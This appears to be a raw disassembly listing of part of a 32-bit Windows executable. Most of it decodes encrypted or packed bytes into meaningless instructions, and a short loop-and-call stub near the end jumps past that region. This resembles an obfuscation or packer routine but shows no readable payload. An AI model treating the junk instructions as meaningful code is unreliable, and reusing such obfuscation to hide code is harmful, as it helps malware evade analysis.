  401841:	lods   al,BYTE PTR ds:[esi]
  401842:	retf   0x1e5a
  401845:	in     eax,dx
  401846:	outs   dx,DWORD PTR ds:[esi]
  401847:	xchg   ebx,eax
  401848:	inc    eax
  401849:	sub    al,0x46
  40184b:	xor    al,0x3a
  40184d:	sbb    al,BYTE PTR [esi-0x72]
  401850:	xchg   edi,eax
  401851:	inc    ebx
  401852:	sbb    al,0x4d
  401854:	repz neg BYTE PTR [ebp+0x4c45dde9]
  40185b:	imul   esp,DWORD PTR gs:[ebp-0x5f90278],0x39
  401863:	pop    es
  401864:	into   
  401865:	retf   
  401866:	add    BYTE PTR [ecx-0x28344bfe],0x5
  40186d:	cdq    
  40186e:	add    ebp,ebx
  401870:	fldenv [eax+edi*8-0x3c]
  401874:	or     DWORD PTR [eiz*1-0x34d1c3d6],ebp
  40187b:	sbb    BYTE PTR [edi+0x1a],cl
  40187e:	rcl    BYTE PTR [ebx+0x741e1296],cl
  401884:	pop    es
  401885:	cmp    eax,0x5d2f90a6
  40188a:	in     eax,0x7e
  40188c:	cld    
  40188d:	or     esi,esi
  40188f:	sub    DWORD PTR [eax+0x18],esi
  401892:	rcr    BYTE PTR [edi-0x1f],0x11
  401896:	push   ebp
  401897:	or     DWORD PTR [edi],ebp
  401899:	jp     0x401894
  40189b:	sub    esi,DWORD PTR ds:0x5602a272
  4018a1:	sar    BYTE PTR [ebp-0x742b79c7],cl
  4018a7:	imul   edi,eax,0x19e99c2a
  4018ad:	test   al,0x6e
  4018af:	retf   0x9a07
  4018b2:	or     DWORD PTR [esi],esp
  4018b4:	cmp    al,0x20
  4018b6:	mov    ah,0x4
  4018b8:	mov    esi,DWORD PTR [ecx+ebx*4+0x36]
  4018bc:	jo     0x4018af
  4018be:	jo     0x40187f
  4018c0:	sub    bl,BYTE PTR [ecx+0x18]
  4018c3:	imul   eax,esp,0xfffffffc
  4018c6:	(bad)  
  4018c7:	les    ebp,FWORD PTR [ebx]
  4018c9:	pop    ds
  4018ca:	test   eax,0xcc9bcff6
  4018cf:	jecxz  0x4018e4
  4018d1:	jbe    0x401889
  4018d3:	cmc    
  4018d4:	mov    ebp,0xd270b993
  4018d9:	repz cwde 
  4018db:	loopne 0x40190e
  4018dd:	dec    esp
  4018de:	jmp    0x537:0x4788c60d
  4018e5:	push   cs
  4018e6:	mov    ds:0x691c3ff3,eax
  4018eb:	lods   eax,DWORD PTR ds:[esi]
  4018ec:	jns    0x401936
  4018ee:	aad    0xe0
  4018f0:	loopne 0x401899
  4018f2:	xor    esp,ebx
  4018f4:	nop
  4018f5:	jmp    DWORD PTR [edx-0x35facae8]
  4018fb:	mov    esp,0x2e982593
  401900:	(bad)  
  401902:	xchg   ebx,eax
  401903:	pusha  
  401904:	mov    ?,WORD PTR [esi+ebx*1]
  401907:	push   ebx
  401908:	jle    0x401986
  40190a:	hlt    
  40190b:	pop    ss
  40190c:	bound  ebx,QWORD PTR [esi]
  40190e:	out    0x29,al
  401910:	jmp    0xef20:0xbde79420
  401917:	mov    bh,0x33
  401919:	das    
  40191a:	push   ss
  40191b:	mov    BYTE PTR [ecx+eiz*2],cl
  40191e:	jno    0x401940
  401920:	ins    DWORD PTR es:[edi],dx
  401921:	into   
  401922:	mov    bl,0x98
  401924:	pop    ebx
  401925:	dec    edi
  401926:	imul   eax,DWORD PTR [esi],0x2d
  401929:	inc    ecx
  40192a:	adc    al,0xad
  40192c:	sar    DWORD PTR [eax-0x3df138b7],1
  401932:	xor    al,BYTE PTR [ecx]
  401934:	call   0xc475fbd1
  401939:	icebp  
  40193a:	inc    ebx
  40193b:	and    bh,0xb0
  40193e:	jecxz  0x4018fd
  401940:	jl     0x4019ba
  401942:	xor    al,0xf6
  401944:	xor    eax,0x6e0c297f
  401949:	or     eax,0x225fb90a
  40194e:	stc    
  40194f:	retf   
  401950:	pop    ss
  401951:	or     edi,DWORD PTR [ebp-0x6b]
  401954:	inc    ebx
  401955:	das    
  401956:	je     0x4019c3
  401958:	inc    esi
  401959:	ja     0x4018fd
  40195b:	add    eax,DWORD PTR ds:0x6deaf826
  401961:	shl    al,1
  401963:	mov    esi,0x12a67d9c
  401968:	(bad)  
  40196a:	call   0xda99:0x69f4b7ce
  401971:	loopne 0x4019a8
  401973:	sbb    ah,BYTE PTR [ebx]
  401975:	call   0xb194:0xa75f11f
  40197c:	mov    ecx,0x6f4f740
  401981:	jge    0x40199d
  401983:	cmp    bl,BYTE PTR [edx-0x118b49bc]
  401989:	mov    ecx,0x9a41cf3
  40198e:	add    BYTE PTR [ebp+esi*2+0x68],bl
  401992:	aad    0x7a
  401994:	(bad)  [eax]
  401996:	mov    edx,0x33e9937d
  40199b:	xor    esp,eax
  40199d:	enter  0xe75f,0xf7
  4019a1:	cwde   
  4019a2:	retf   
  4019a3:	jle    0x4019c8
  4019a5:	xchg   esi,esp
  4019a7:	pop    esp
  4019a8:	inc    ebx
  4019a9:	jo     0x4019dd
  4019ab:	dec    ecx
  4019ac:	iret   
  4019ad:	and    ch,BYTE PTR [ebx-0x34]
  4019b0:	mov    dh,0x79
  4019b2:	bound  esp,QWORD PTR [ebp-0x76]
  4019b5:	stos   BYTE PTR es:[edi],al
  4019b6:	push   ecx
  4019b7:	int    0x36
  4019b9:	(bad)
  4019bc:	cs in  eax,dx
  4019be:	test   DWORD PTR [ecx],0x5ccde3c0
  4019c4:	xor    edx,DWORD PTR [edx]
  4019c6:	stc    
  4019c7:	ror    DWORD PTR [eax],cl
  4019c9:	jmp    0xd853:0xaf2e3639
  4019d0:	sbb    eax,0x29cf5892
  4019d5:	fwait
  4019d6:	inc    eax
  4019d7:	adc    eax,0xd8b6d418
  4019dc:	sbb    DWORD PTR [ebx+0x4c3505bf],ebp
  4019e2:	loop   0x401a42
  4019e4:	mov    dl,BYTE PTR [ecx-0x6079f69]
  4019ea:	(bad)  [eax+0x63c22947]
  4019f0:	call   0xa4733d2a
  4019f5:	call   0x8005c2d6
  4019fa:	je     0x4019c0
  4019fc:	aas    
  4019fd:	jbe    0x401a67
  4019ff:	ret    0xd647
  401a02:	or     cl,BYTE PTR ds:0x8ef354f6
  401a08:	and    BYTE PTR [ebx+0x3bf8f735],dl
  401a0e:	fisttp QWORD PTR [ebp+0x354feb40]
  401a14:	pop    ecx
  401a15:	shr    eax,1
  401a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a18:	jnp    0x4019d4
  401a1a:	outs   dx,BYTE PTR ds:[esi]
  401a1b:	pop    ecx
  401a1c:	push   edi
  401a1d:	repnz or al,0x62
  401a20:	or     ecx,esi
  401a22:	push   es
  401a23:	hlt    
  401a24:	call   0x1242:0xfbdeb24d
  401a2b:	dec    dx
  401a2d:	mov    al,ds:0xe8594122
  401a32:	sbb    edx,eax
  401a34:	mov    al,0x7c
  401a36:	outs   dx,BYTE PTR ds:[esi]
  401a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a38:	jmp    0x9222:0x9f356d41
  401a3f:	pop    esp
  401a40:	xchg   eax,ecx
  401a42:	cdq    
  401a43:	xchg   BYTE PTR [edi],ah
  401a45:	js     0x401a09
  401a47:	adc    ch,BYTE PTR [esi+0x468b17f2]
  401a4d:	pop    ss
  401a4e:	mov    eax,0x79494cfe
  401a53:	xchg   edi,eax
  401a54:	mov    eax,ds:0xfa33b659
  401a59:	jmp    0x1d511e15
  401a5e:	popa   
  401a5f:	stos   BYTE PTR es:[edi],al
  401a60:	aad    0xd3
  401a62:	cmp    DWORD PTR [ecx-0x89658a3],ecx
  401a68:	inc    ebp
  401a69:	(bad)  
  401a6a:	in     eax,0xd1
  401a6c:	jl     0x4019f4
  401a6e:	inc    ecx
  401a6f:	or     bh,ch
  401a71:	hlt    
  401a72:	out    dx,eax
  401a73:	sbb    al,0xf8
  401a75:	mov    eax,ds:0x65aeacb4
  401a7a:	test   eax,0x73b123c2
  401a7f:	daa    
  401a80:	jmp    0xe0989d89
  401a85:	xchg   esp,eax
  401a86:	jbe    0x401ac5
  401a88:	xchg   esp,eax
  401a89:	mov    ecx,0x4910a5b7
  401a8e:	jno    0x401a10
  401a90:	(bad)  
  401a91:	cmp    BYTE PTR [edx+0x1cecd90b],dl
  401a97:	mov    al,ds:0x4275a00c
  401a9c:	aaa    
  401a9d:	into   
  401a9e:	jb     0x401aeb
  401aa0:	dec    edi
  401aa1:	pop    edi
  401aa2:	mov    bl,0x6f
  401aa4:	push   esi
  401aa5:	sbb    ebx,DWORD PTR ds:0x42a3a9
  401aab:	mov    esi,0x7510850
  401ab0:	xor    eax,esi
  401ab2:	push   edi
  401ab3:	add    ecx,0x2d8a
  401ab9:	mov    edi,0x327298
  401abe:	mov    ecx,DWORD PTR ds:0x42a30d
  401ac4:	mov    ebx,DWORD PTR ds:0x42a3bd
  401aca:	sub    ecx,ebx
  401acc:	and    ecx,DWORD PTR [ecx+ebx*1]
  401acf:	add    eax,edi
  401ad1:	mov    DWORD PTR ds:0x42a3e1,0x1cd1
  401adb:	jmp    0x401fe6
  401ae0:	enter  0xcbc2,0xd1
  401ae4:	(bad)  
  401ae6:	(bad)  
  401ae7:	shr    DWORD PTR [esi-0x3c],0xd6
  401aeb:	mov    bl,0x2f
  401aed:	jmp    0x401b36
  401aef:	push   0x54
  401af1:	pop    es
  401af2:	js     0x401b6c
  401af4:	push   0x7c
  401af6:	js     0x401b70
  401af8:	in     al,dx
  401af9:	fwait
  401afa:	rol    DWORD PTR [edx+eiz*2-0x36],cl
  401afe:	loope  0x401b28
  401b00:	int    0x2b
  401b02:	push   0xffffffa8
  401b04:	mov    dh,0x46
  401b06:	repz (bad) 
  401b09:	adc    ecx,esi
  401b0b:	test   BYTE PTR [edx-0x6683c4ce],ch
  401b11:	out    dx,al
  401b12:	das    
  401b13:	push   esp
  401b14:	das    
  401b15:	daa    
  401b16:	test   eax,0x26f663f6
  401b1b:	xchg   DWORD PTR [esi],ebp
  401b1d:	push   esi
  401b1e:	data16 sti 
  401b20:	gs inc ecx
  401b22:	cdq    
  401b23:	int    0xbc
  401b25:	aaa    
  401b26:	lock lea esp,[ecx+0x1befb51d]
  401b2d:	shl    BYTE PTR [ecx],1
  401b2f:	outs   dx,DWORD PTR ds:[esi]
  401b30:	enter  0x2078,0x43
  401b34:	xchg   ebx,eax
  401b35:	and    BYTE PTR [ecx],0xf
  401b38:	pushf  
  401b39:	ror    BYTE PTR [ecx-0x390c5970],1
  401b3f:	repnz cmp DWORD PTR [ebx],ecx
  401b42:	imul   esi,DWORD PTR [ecx+esi*4-0xce352cb],0x19
  401b4a:	cmc    
  401b4b:	cmp    BYTE PTR [ecx-0x2642c13b],ch
  401b51:	js     0x401b42
  401b53:	jno    0x401aef
  401b55:	lds    ebx,FWORD PTR [edx+0x66]
  401b58:	cmp    dl,BYTE PTR [ebx]
  401b5a:	dec    edx
  401b5b:	pop    ss
  401b5c:	mov    ds:0x1527aae2,al
  401b61:	call   DWORD PTR [ecx]
  401b63:	adc    BYTE PTR [eax+0x10],dh
  401b66:	pop    esi
  401b67:	and    al,0xb8
  401b69:	mov    ebx,0x1d1925a3
  401b6e:	leave  
  401b6f:	out    0xa5,eax
  401b71:	popa   
  401b72:	jbe    0x401b3b
  401b74:	jae    0x401b0f
  401b76:	retf   
  401b77:	dec    ecx
  401b78:	(bad)  
  401b79:	or     al,0x24
  401b7b:	repz in al,dx
  401b7d:	mov    ds:0xf69a51e2,eax
  401b82:	pop    ebx
  401b83:	shr    DWORD PTR [edi],0x7c
  401b86:	and    al,0xb6
  401b88:	mov    dh,BYTE PTR ds:[edx-0x49e35db]
  401b8f:	mov    esi,0x60201a53
  401b94:	pop    es
  401b95:	xchg   ebp,eax
  401b96:	cli    
  401b97:	sub    eax,0xfca5b50a
  401b9c:	ja     0x401bf1
  401b9e:	rol    BYTE PTR [ebx+eiz*2+0x63],1
  401ba2:	jae    0x401ba8
  401ba4:	cmp    bl,cl
  401ba6:	cdq    
  401ba7:	sahf   
  401ba8:	retf   
  401ba9:	popf   
  401baa:	retf   0xef9
  401bad:	adc    BYTE PTR [ebx+eiz*4],bl
  401bb0:	mov    eax,0xa7853a7f
  401bb5:	lods   al,BYTE PTR ds:[esi]
  401bb6:	data16 (bad) 
  401bb9:	and    eax,0x8c9d0dba
  401bbe:	push   edi
  401bbf:	mov    esi,0x328de79b
  401bc4:	std    
  401bc5:	xor    al,dl
  401bc7:	mov    DWORD PTR [ecx],ecx
  401bc9:	mov    eax,ds:0xe5c5f4fb
  401bce:	outs   dx,BYTE PTR ds:[esi]
  401bcf:	cmp    DWORD PTR [ecx],ecx
  401bd1:	sub    al,0x10
  401bd3:	pop    eax
  401bd4:	shr    BYTE PTR [ebp+0x5b],cl
  401bd7:	mov    esp,0x2a669078
  401bdc:	adc    BYTE PTR [ecx+0x3d1ecaa2],dh
  401be2:	inc    edi
  401be3:	push   cs
  401be4:	test   DWORD PTR [ebp-0x9],eax
  401be7:	cld    
  401be8:	cmp    cl,BYTE PTR [ecx+0x5d855d7d]
  401bee:	mov    ecx,DWORD PTR ds:0xe1aa077c
  401bf4:	shl    BYTE PTR [esi],0x81
  401bf7:	ins    DWORD PTR es:[edi],dx
  401bf8:	dec    esi
  401bf9:	jae    0x401c0d
  401bfb:	add    edi,edi
  401bfd:	pop    es
  401bfe:	ins    BYTE PTR es:[edi],dx
  401bff:	pop    ebx
  401c00:	or     DWORD PTR [edi+0x2a],esi
  401c03:	pop    ebp
  401c04:	es stc 
  401c06:	push   0x4c865294
  401c0b:	(bad)  
  401c0c:	aad    0x97
  401c0e:	rcl    DWORD PTR [edx+0xa],cl
  401c11:	sub    DWORD PTR [ebx-0x7c],esi
  401c14:	xor    eax,0x44477ae5
  401c19:	out    dx,eax
  401c1a:	int3   
  401c1b:	(bad)  
  401c1c:	sbb    eax,0x26a3575e
  401c21:	pop    edi
  401c22:	mov    ch,0xbc
  401c24:	popf   
  401c25:	leave  
  401c26:	pop    ebp
  401c27:	adc    al,0x8d
  401c29:	ror    esp,cl
  401c2b:	sub    eax,0x266d871f
  401c30:	jae    0x401c4b
  401c32:	inc    esp
  401c33:	push   es
  401c34:	hlt    
  401c35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c36:	adc    BYTE PTR ds:0xc728b32c,bh
  401c3c:	mov    eax,0x1ca3a33e
  401c41:	jge    0x401c9b
  401c43:	add    DWORD PTR [ebp+0x20e76461],eax
  401c49:	and    al,al
  401c4b:	mov    DWORD PTR [edi],edi
  401c4d:	in     al,dx
  401c4e:	outs   dx,DWORD PTR ds:[esi]
  401c4f:	sub    BYTE PTR [ecx],0x75
  401c52:	or     DWORD PTR [ebx+0x50],eax
  401c55:	sbb    ch,bl
  401c57:	test   al,0x0
  401c59:	mov    ebx,0xa389e5dd
  401c5e:	lahf   
  401c5f:	lds    ecx,FWORD PTR [ecx-0x2852befe]
  401c65:	xor    edi,ecx
  401c67:	loop   0x401c93
  401c69:	and    ebx,DWORD PTR [ebx-0x58148e11]
  401c6f:	stc    
  401c70:	rcl    bh,1
  401c72:	jno    0x401cb3
  401c74:	sbb    ebp,DWORD PTR [ecx-0x67]
  401c77:	sbb    BYTE PTR [edx+0x21],0x39
  401c7b:	and    eax,DWORD PTR [edi+0x15]
  401c7e:	adc    eax,edi
  401c80:	mov    bl,0xb1
  401c82:	jl     0x401c6e
  401c84:	mov    eax,0x76a311e8
  401c89:	mov    ds:0x98a75c16,al
  401c8e:	stc    
  401c8f:	jp     0x401ca4
  401c91:	pop    ebp
  401c92:	out    0x61,eax
  401c94:	js     0x401c58
  401c96:	dec    edi
  401c97:	xor    BYTE PTR [ecx-0x1b],0x25
  401c9b:	lds    esi,FWORD PTR [edx]
  401c9d:	adc    BYTE PTR [ebx+0x69],bh
  401ca0:	in     al,dx
  401ca1:	dec    eax
  401ca2:	idiv   BYTE PTR [ebx+edi*1]
  401ca5:	pop    esp
  401ca6:	sub    DWORD PTR [edi+0x3a],ebp
  401ca9:	or     eax,0x2566acdc
  401cae:	pop    ebp
  401caf:	or     cl,BYTE PTR [edi]
  401cb1:	retf   
  401cb2:	xchg   edi,eax
  401cb3:	pop    edx
  401cb4:	fadd   st,st(3)
  401cb6:	popa   
  401cb7:	mov    esi,DWORD PTR [edx+0x29]
  401cba:	sar    BYTE PTR [edx-0x4d7c2f8a],0x30
  401cc1:	add    eax,0xd5d2138e
  401cc6:	sar    edi,cl
  401cc8:	shr    DWORD PTR [ecx+0x31d4900a],0xde
  401ccf:	pop    edx
  401cd0:	sbb    eax,0xd14edcdb
  401cd5:	cmp    bl,BYTE PTR [ebx+0x32524969]
  401cdb:	or     eax,0x67064a92
  401ce0:	js     0x401d35
  401ce2:	xor    ebp,eax
  401ce4:	jmp    0xf8d7:0xe4c9a5bb
  401ceb:	adc    BYTE PTR [ebx-0x56],bh
  401cee:	inc    esp
  401cef:	sub    BYTE PTR [esi+esi*2-0x8c0edb],bh
  401cf6:	imul   edi,DWORD PTR [edi+0x42],0x30279743
  401cfd:	stc    
  401cfe:	pop    edx
  401cff:	adc    esp,DWORD PTR [esi]
  401d01:	mov    al,ds:0xe7525d3d
  401d06:	jmp    0x401d24
  401d08:	push   ebp
  401d09:	outs   dx,DWORD PTR ds:[esi]
  401d0a:	fst    DWORD PTR [eax]
  401d0c:	es dec ebp
  401d0e:	xchg   esi,eax
  401d0f:	lahf   
  401d10:	cmp    esi,ebx
  401d12:	fdiv   DWORD PTR ds:0xd4d24a6a
  401d18:	loop   0x401cac
  401d1a:	repz sub eax,0x321f5c31
  401d20:	dec    ebx
  401d21:	pop    esp
  401d22:	and    BYTE PTR [esi],dh
  401d24:	push   ss
  401d25:	mov    DWORD PTR [ebx],edi
  401d27:	xlat   BYTE PTR ds:[ebx]
  401d28:	popa   
  401d29:	jge    0x401d44
  401d2b:	jae    0x401d71
  401d2d:	cmp    BYTE PTR [esi],dh
  401d2f:	mov    edi,0x95926ffd
  401d34:	push   ecx
  401d35:	gs retw 0x373b
  401d3a:	sbb    BYTE PTR [ecx-0x6e],bh
  401d3d:	sub    cl,BYTE PTR [esi+0x66a36b33]
  401d43:	loope  0x401cfa
  401d45:	dec    eax
  401d46:	scas   al,BYTE PTR es:[edi]
  401d47:	fistp  WORD PTR [ecx+0x10]
  401d4a:	loop   0x401dc0
  401d4c:	xor    al,0xea
  401d4e:	and    al,al
  401d50:	popa   
  401d51:	mov    ebx,0xc82cbe99
  401d56:	test   DWORD PTR [edi+ebp*4-0x6b],ebp
  401d5a:	fidivr WORD PTR [edx]
  401d5c:	add    DWORD PTR [edi+eiz*8],ecx
  401d5f:	in     eax,dx
  401d60:	xchg   DWORD PTR [ecx],ebp
  401d62:	retf   0x8fb0
  401d65:	push   ss
  401d66:	pushf  
  401d67:	popa   
  401d68:	jb     0x401cf1
  401d6a:	jne    0x401dac
  401d6c:	cdq    
  401d6d:	or     eax,0x131f8f3f
  401d72:	inc    ecx
  401d73:	sbb    DWORD PTR [esi+esi*1-0x4b],esp
  401d77:	int    0xbb
  401d79:	mov    eax,ds:0xa7f68c6d
  401d7e:	enter  0x26e9,0xdb
  401d82:	and    al,0x9
  401d84:	test   BYTE PTR [edx+0x135681a2],ch
  401d8a:	push   ds
  401d8b:	and    DWORD PTR [ecx-0x1b59a73c],ecx
  401d91:	sbb    DWORD PTR [ebx-0x4e38d517],0xffffffbf
  401d98:	int    0xc3
  401d9a:	jecxz  0x401d23
  401d9c:	push   eax
  401d9e:	add    al,0x9d
  401da0:	cmp    eax,0xa4d10f8d
  401da5:	xor    ebp,DWORD PTR [ebp-0x53]
  401da8:	loopne 0x401db0
  401daa:	mov    esp,0xf69a0086
  401daf:	pop    ecx
  401db0:	xchg   ebx,eax
  401db1:	or     bh,BYTE PTR [esi]
  401db3:	adc    DWORD PTR [esi-0x3c151b1b],ecx
  401db9:	adc    bh,BYTE PTR [eax]
  401dbb:	inc    edi
  401dbc:	fwait
  401dbd:	xchg   ecx,eax
  401dbe:	repz inc eax
  401dc0:	pop    es
  401dc1:	cmp    eax,0x74c64544
  401dc6:	in     al,0x7a
  401dc8:	sub    eax,eax
  401dca:	std    
  401dcb:	mov    ebp,DWORD PTR [edi+0x1d]
  401dce:	add    BYTE PTR [edx-0x4d523673],dh
  401dd4:	ret    0x9b93
  401dd7:	or     DWORD PTR gs:[edx-0x43],ebp
  401ddb:	xchg   DWORD PTR [eax],edi
  401ddd:	(bad)  
  401dde:	into   
  401ddf:	sub    al,0x5e
  401de1:	aas    
  401de2:	imul   ebp,DWORD PTR [eax],0xd01fa3b6
  401de8:	fist   WORD PTR [ebx+0x41]
  401deb:	dec    esi
  401dec:	int    0xab
  401dee:	xchg   esi,eax
  401def:	(bad)  
  401df0:	fcmovu st,st(0)
  401df2:	retf   
  401df3:	bound  esp,QWORD PTR [edx]
  401df5:	imul   esi,DWORD PTR [ebx-0x74],0xeb60ec0d
  401dfc:	not    ebp
  401dfe:	xor    bh,BYTE PTR [edi+0x7fc44ded]
  401e04:	pushf  
  401e05:	xor    DWORD PTR [ebx-0x38],ebx
  401e08:	inc    ebx
  401e09:	xor    ebx,DWORD PTR [ebx]
  401e0b:	push   cs
  401e0c:	int3   
  401e0d:	xor    DWORD PTR [edi-0x12],eax
  401e10:	or     edi,ebp
  401e12:	(bad)  
  401e13:	aam    0x5f
  401e15:	arpl   WORD PTR [ebx-0x7d],ax
  401e18:	imul   edi,DWORD PTR [ecx+0x50939ac4],0xb5935dc5
  401e22:	push   eax
  401e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e24:	out    dx,al
  401e25:	shr    esp,cl
  401e27:	cli    
  401e28:	inc    esp
  401e29:	bound  esi,QWORD PTR [ecx]
  401e2b:	or     al,0xf4
  401e2d:	pop    edx
  401e2e:	sub    al,0xec
  401e30:	inc    ebx
  401e31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e32:	test   BYTE PTR [edx+0x20],0x5e
  401e36:	push   ebp
  401e37:	xlat   BYTE PTR ds:[ebx]
  401e38:	or     eax,0x1c9dd2fe
  401e3d:	cmp    al,0x7f
  401e3f:	sar    DWORD PTR es:[edi+0x46],1
  401e43:	dec    ebp
  401e44:	aam    0xa6
  401e46:	pushf  
  401e47:	mov    dl,0xcb
  401e49:	dec    esi
  401e4a:	push   edi
  401e4b:	pushf  
  401e4c:	cmp    BYTE PTR [ecx],dl
  401e4e:	push   ebx
  401e4f:	mul    DWORD PTR [edx]
  401e51:	fistp  DWORD PTR [ecx-0x39]
  401e54:	(bad)  
  401e55:	aas    
  401e56:	mov    cl,BYTE PTR [edx+0x41498829]
  401e5c:	dec    edx
  401e5d:	mov    cl,0x59
  401e5f:	add    DWORD PTR [eax-0x38fdef3e],ecx
  401e65:	ret    
  401e66:	push   ss
  401e67:	stc    
  401e68:	sti    
  401e69:	stos   BYTE PTR es:[edi],al
  401e6a:	cmp    DWORD PTR [ebp+0x11],esi
  401e6d:	push   ebx
  401e6e:	(bad)  
  401e70:	repnz ds push edi
  401e73:	pop    esi
  401e74:	idiv   DWORD PTR [edi+0x6]
  401e77:	pop    es
  401e78:	sbb    al,0xf9
  401e7a:	push   ss
  401e7b:	loope  0x401dff
  401e7d:	add    al,0x3c
  401e7f:	sub    eax,0xf0e80a75
  401e84:	fcomp  DWORD PTR [edx]
  401e86:	dec    edi
  401e87:	dec    ecx
  401e88:	daa    
  401e89:	enter  0xf672,0xc7
  401e8d:	enter  0xc282,0x9d
  401e91:	mov    edi,0xc78825f8
  401e96:	pusha  
  401e97:	mov    esp,0x47a14c4
  401e9c:	das    
  401e9d:	int3   
  401e9e:	adc    eax,eax
  401ea0:	mov    al,ds:0xbb4ae7d5
  401ea5:	xor    al,0x4
  401ea7:	jbe    0x401e7d
  401ea9:	cmp    ah,BYTE PTR [edx]
  401eab:	inc    eax
  401eac:	push   ecx
  401ead:	xchg   BYTE PTR [ecx-0xe8f94ad],al
  401eb3:	mul    DWORD PTR [edi]
  401eb5:	(bad)  
  401eb6:	sti    
  401eb7:	in     al,dx
  401eb8:	loopne 0x401e47
  401eba:	in     al,dx
  401ebb:	dec    edx
  401ebc:	jno    0x401e94
  401ebe:	jle    0x401eee
  401ec0:	dec    ebx
  401ec1:	loop   0x401f27
  401ec3:	jg     0x401e60
  401ec5:	jle    0x401f02
  401ec7:	fisttp WORD PTR [ecx+0x2a]
  401eca:	sti    
  401ecb:	push   eax
  401ecc:	xlat   BYTE PTR ds:[ebx]
  401ecd:	and    BYTE PTR [eax+0x1c],dh
  401ed0:	gs out dx,al
  401ed2:	pop    edi
  401ed3:	in     al,dx
  401ed4:	scas   al,BYTE PTR es:[edi]
  401ed5:	loope  0x401ea1
  401ed7:	aam    0xc9
  401ed9:	stos   BYTE PTR es:[edi],al
  401eda:	shr    DWORD PTR [edx],1
  401edc:	ins    BYTE PTR es:[edi],dx
  401edd:	daa    
  401ede:	and    eax,0x5cc9bd75
  401ee3:	lahf   
  401ee4:	clc    
  401ee5:	push   esi
  401ee6:	pop    ss
  401ee7:	and    al,BYTE PTR [edi-0x4f]
  401eea:	ret    
  401eeb:	sti    
  401eec:	pop    edi
  401eed:	sub    eax,DWORD PTR [edi+0x719ab9d4]
  401ef3:	repz mov ebx,0xb7f38e4f
  401ef9:	push   cs
  401efa:	pop    es
  401efb:	mov    ebp,0xcc81c7d7
  401f00:	or     DWORD PTR [ebx-0x1ef1d341],edi
  401f06:	int3   
  401f07:	scas   eax,DWORD PTR es:[edi]
  401f08:	ror    BYTE PTR [eax-0xe],cl
  401f0b:	and    ah,BYTE PTR [edi-0x6f01afdd]
  401f11:	mov    ds:0xb4dab055,al
  401f16:	mov    dl,0xde
  401f18:	push   esi
  401f19:	dec    ecx
  401f1a:	adc    edi,DWORD PTR [ecx]
  401f1c:	es add cl,bh
  401f1f:	push   cs
  401f20:	or     dh,bh
  401f22:	(bad)  [eax]
  401f24:	fs pop ebp
  401f26:	dec    edx
  401f27:	das    
  401f28:	jnp    0x401eeb
  401f2a:	loopne 0x401ece
  401f2c:	icebp  
  401f2d:	jle    0x401ec0
  401f2f:	push   cs
  401f30:	or     ebx,esp
  401f32:	jae    0x401f43
  401f34:	call   0xc859:0x4a8dbdf5
  401f3b:	mov    ah,0x26
  401f3d:	adc    edi,DWORD PTR [edx-0x563929d3]
  401f43:	xor    eax,0xdbf3122e
  401f48:	dec    eax
  401f49:	jmp    edx
  401f4b:	or     esi,DWORD PTR [esp+edi*8-0x4c]
  401f4f:	fs adc ebp,edx
  401f52:	inc    edx
  401f53:	cmovo  eax,DWORD PTR [ebx+0xe510727]
  401f5a:	leave  
  401f5b:	mov    eax,ds:0x38b0ec1e
  401f60:	sti    
  401f61:	rcr    edi,0xa9
  401f64:	ret    0x6a15
  401f67:	loope  0x401fbb
  401f69:	sbb    eax,0xed1bdb0f
  401f6e:	(bad)  
  401f6f:	in     al,dx
  401f70:	jo     0x401f41
  401f72:	in     eax,dx
  401f73:	push   ss
  401f74:	sub    DWORD PTR [esi+0x79],0xfb266d73
  401f7b:	jg     0x401fb6
  401f7d:	clc    
  401f7e:	jmp    0x2beb:0x678d8e28
  401f85:	imul   ecx,DWORD PTR [ebp+0x4d],0xe973bab0
  401f8c:	xor    edx,DWORD PTR [ecx-0x1e8dfbe2]
  401f92:	mov    ds:0x71ce1295,al
  401f97:	mov    al,0x22
  401f99:	call   0xb75c324c
  401f9e:	test   al,0x94
  401fa0:	inc    esp
  401fa1:	and    eax,0xb13ede55
  401fa6:	test   BYTE PTR [esi],cl
  401fa8:	lock sub eax,eax
  401fab:	icebp  
  401fac:	inc    ebp
  401fad:	or     al,0x6
  401faf:	mov    dl,0x64
  401fb1:	fdivr  DWORD PTR [ebp-0x19fa77bc]
  401fb7:	jp     0x40200e
  401fb9:	lds    ebp,FWORD PTR [ebx]
  401fbb:	retf   0x5c5e
  401fbe:	test   esp,ebp
  401fc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fc1:	stc    
  401fc2:	stc    
  401fc3:	pop    ss
  401fc4:	imul   edi,ebx,0xbed4b813
  401fca:	pop    ebp
  401fcb:	pusha  
  401fcc:	xor    ch,ch
  401fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fcf:	cmp    dl,bl
  401fd1:	and    ah,dl
  401fd3:	lods   al,BYTE PTR ds:[esi]
  401fd4:	push   eax
  401fd5:	ins    BYTE PTR es:[edi],dx
  401fd6:	dec    esp
  401fd7:	and    eax,0xd28fb5a4
  401fdc:	xchg   DWORD PTR [esi+0x67],esp
  401fdf:	shl    BYTE PTR [ebx],cl
  401fe1:	inc    ebx
  401fe2:	iret   
  401fe3:	out    dx,eax
  401fe4:	jnp    0x401fcb
  401fe6:	mov    DWORD PTR [ebp-0x38],eax
  401fe9:	not    DWORD PTR ds:0x42a3ad
  401fef:	mov    DWORD PTR [ebp-0x44],0xf89cb538
  401ff6:	and    DWORD PTR ds:0x42a395,0x0
  402000:	mov    ecx,DWORD PTR ds:0x42a395
  402006:	inc    ecx
  402007:	mov    DWORD PTR ds:0x42a395,ecx
  40200d:	cmp    DWORD PTR ds:0x42a395,0x20
  402014:	jne    0x402025
  40201a:	push   0x13e2
  40201f:	call   DWORD PTR ds:0x4251cc
  402025:	cmp    DWORD PTR ds:0x42a395,0x18
  40202c:	jb     0x402000
  402032:	mov    DWORD PTR [ebp-0x54],0xf89f0538
  402039:	and    DWORD PTR ds:0x42a2bd,0x0
  402043:	mov    eax,ds:0x42a2bd
  402048:	inc    eax
  402049:	mov    ds:0x42a2bd,eax
  40204e:	cmp    DWORD PTR ds:0x42a2bd,0x18
  402055:	jne    0x40206b
  40205b:	push   0x2bdc
  402060:	push   0x7e39
